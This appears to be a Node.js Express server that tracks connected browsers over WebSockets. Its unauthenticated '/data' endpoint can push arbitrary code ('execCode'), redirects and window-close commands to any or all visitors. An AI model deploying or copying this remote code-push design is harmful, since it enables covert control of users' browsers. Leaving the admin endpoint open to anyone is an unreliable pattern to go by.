const express = require("express");
const app = express();
require("express-ws")(app);
const path = require("path");
const fs = require("fs");


const clients = new Map();

function getLowestAvailableId() {
  const usedIds = new Set([...clients.values()].filter(v => typeof v === "number"));
  let id = 1;
  while (usedIds.has(id)) id++;
  return id;
}

app.ws("/", function (ws, req) {
  clients.set(ws, "unknown");

  ws.on("message", function (msg) {
    const msgData = JSON.parse(msg);

    switch (msgData.type) {
      case 'loadSessionId':
        clients.set(ws, { id: msgData.id, url: msgData.url || null });
        ws.send(JSON.stringify({ type: 'setId', id: msgData.id }));
        break;

      case 'unknownSessionId':
        const newId = getLowestAvailableId();
        clients.set(ws, { id: newId, url: msgData.url || null });
        ws.send(JSON.stringify({ type: 'setId', id: newId }));
        break;
      case 'getSessionId':
        ws.send(JSON.stringify({type:'giveId',id:clients.get(ws)}));
        break;
    }
  });

  ws.on("close", function () {
    clients.delete(ws);
  });
});
app.use(express.json());
app.get("/", (req, res) => {
  res.send('<meta http-equiv="refresh" content="0; URL=/home" />');
});

const htmlDir = path.join(__dirname, "html");

app.post("/data", (req, res) => {
  const data = req.body;

  console.log("Admin request:", data);

  switch (data.type) {
    case 'fetchClients':
      res.json({
        clients: Array.from(clients.entries()).map(([ws, session]) => ({
          id: session.id,
          connected: ws.readyState === 1,
          url: session.url || null,
        }))
      });
      break;

    case 'closeAllClients':
      clients.forEach((_, ws) => {
        if (ws.readyState === 1) {
          ws.send(JSON.stringify({ type: 'closeWindow' }));
        }
      });
      res.json({ status: 'sent close request to all clients' });
      break;

    case 'broadcastMessage': {
      const message = {
        type: 'broadcast',
        message: data.message,
      };
      const targets = data.targets;

      if (targets === "all") {
        clients.forEach((_, ws) => {
          if (ws.readyState === 1) {
            ws.send(JSON.stringify(message));
          }
        });
      } else {
        clients.forEach((session, ws) => {
          if (targets.includes(String(session.id)) && ws.readyState === 1) {
            ws.send(JSON.stringify(message));
          }
        });
      }

      res.json({ status: 'broadcast sent' });
      break;
    }

    case 'execCode': {
      const payload = {
        type: 'execCode',
        code: data.code,
      };
      const targets = data.targets;

      if (targets === "all") {
        clients.forEach((_, ws) => {
          if (ws.readyState === 1) {
            ws.send(JSON.stringify(payload));
          }
        });
      } else {
        clients.forEach((session, ws) => {
          if (targets.includes(String(session.id)) && ws.readyState === 1) {
            ws.send(JSON.stringify(payload));
          }
        });
      }

      res.json({ status: 'code execution request sent' });
      break;
    }

    case 'setHref': {
      const payload = {
        type: 'navigate',
        url: data.url,
      };
      const targets = data.targets;

      if (targets === "all") {
        clients.forEach((_, ws) => {
          if (ws.readyState === 1) {
            ws.send(JSON.stringify(payload));
          }
        });
      } else {
        clients.forEach((session, ws) => {
          if (targets.includes(String(session.id)) && ws.readyState === 1) {
            ws.send(JSON.stringify(payload));
          }
        });
      }

      res.json({ status: 'navigation request sent' });
      break;
    }

    case 'closeClients': {
      const targets = data.targets;

      clients.forEach((session, ws) => {
        if (targets.includes(String(session.id)) && ws.readyState === 1) {
          ws.send(JSON.stringify({ type: 'closeWindow' }));
        }
      });

      res.json({ status: 'close request sent to specific clients' });
      break;
    }

    default:
      res.status(400).json({ error: 'Unknown request type' });
  }
});


// dybamic web server
app.get("/*id", (req, res) => {
  let page = req.path;
  let filePath = path.join(htmlDir, `${page}`);
  console.log(`looking in ${filePath}`);
  if (page != "/data") {
    if (path.extname(filePath)) {
      fs.access(filePath, fs.constants.F_OK, (err) => {
        if (err) {
          res.sendStatus(404);
        } else {
          res.sendFile(filePath);
        }
      });
    } else {
      filePath = path.join(htmlDir, page, "/index.html");
      console.log(`looking in ${filePath}`);
      fs.access(filePath, fs.constants.F_OK, (err) => {
        if (err) {
          res.sendStatus(404);
        } else {
          res.sendFile(filePath);
        }
      });
    }
  }
});

app.listen(80, () => {
  console.log("Server running on http://localhost");
});
